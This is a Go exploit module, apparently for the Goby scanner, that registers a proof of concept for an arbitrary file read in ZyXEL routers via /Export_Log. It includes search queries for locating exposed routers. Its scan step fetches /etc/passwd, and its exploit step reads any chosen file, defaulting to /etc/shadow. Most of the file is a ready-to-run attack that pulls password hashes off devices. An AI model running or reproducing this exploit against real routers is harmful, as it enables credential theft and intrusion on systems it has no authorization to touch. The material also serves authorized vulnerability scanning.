package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ZyXEL routers Export_Log arbitrary file read",
    "Description": "<p>ZyXEL routers are various router products of ZyXEL company.</p><p>Several ZyXEL routers have an arbitrary file read vulnerability in /Export_Log.</p>",
    "Product": "ZyXEL-Router",
    "Homepage": "https://www.zyxel.com/",
    "DisclosureDate": "2022-12-15",
    "Author": "csca",
    "FofaQuery": "(title=\".:: Welcome to the Web-Based Configuration::.\" && body=\"ZyXEL\") || (title=\"Welcome to the Web-Based Configurator\" && (body=\"/zycss.css\" || body=\"zyxel\")) || title=\"do Router ZyXEL\" || title=\"Welcome to ZyROUTER\" || title=\"ZyXEL Router\" || body=\"<friendlyName>ZyXEL Router</friendlyName>\" || banner=\"ZyXEL-router\"",
    "GobyQuery": "(title=\".:: Welcome to the Web-Based Configuration::.\" && body=\"ZyXEL\") || (title=\"Welcome to the Web-Based Configurator\" && (body=\"/zycss.css\" || body=\"zyxel\")) || title=\"do Router ZyXEL\" || title=\"Welcome to ZyROUTER\" || title=\"ZyXEL Router\" || body=\"<friendlyName>ZyXEL Router</friendlyName>\" || banner=\"ZyXEL-router\"",
    "Level": "2",
    "Impact": "<p>Several ZyXEL routers have an arbitrary file read vulnerability in /Export_Log.</p>",
    "Recommendation": "<p>At present, the manufacturer has fixed the vulnerability, please pay attention to the official website update in time: <a href=\"https://www.zyxel.com/.\">https://www.zyxel.com/.</a></p>",
    "References": [
        "https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/shadow",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Export_Log?/etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:.*:0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Export_Log?{{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "ZyXEL 路由器 Export_Log 任意文件读取",
            "Product": "ZyXEL-Router",
            "Description": "<p>ZyXEL routers 是ZyXEL公司的多款路由器产品。<br></p><p>多款ZyXEL路由器 /Export_Log 存在任意文件读取漏洞，攻击者可获取用户密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已修复该漏洞，请及时关注官网更新：<a href=\"https://www.zyxel.com/\">https://www.zyxel.com/</a>。<br></p>",
            "Impact": "<p>多款ZyXEL路由器 /Export_Log 存在任意文件读取漏洞，攻击者可获取用户密码等敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ZyXEL routers Export_Log arbitrary file read",
            "Product": "ZyXEL-Router",
            "Description": "<p>ZyXEL routers are various router products of ZyXEL company.<br></p><p>Several ZyXEL routers have an arbitrary file read vulnerability in /Export_Log.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has fixed the vulnerability, please pay attention to the official website update in time: <a href=\"https://www.zyxel.com/.\">https://www.zyxel.com/.</a><br></p>",
            "Impact": "<p>Several ZyXEL routers have an arbitrary file read vulnerability in /Export_Log.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}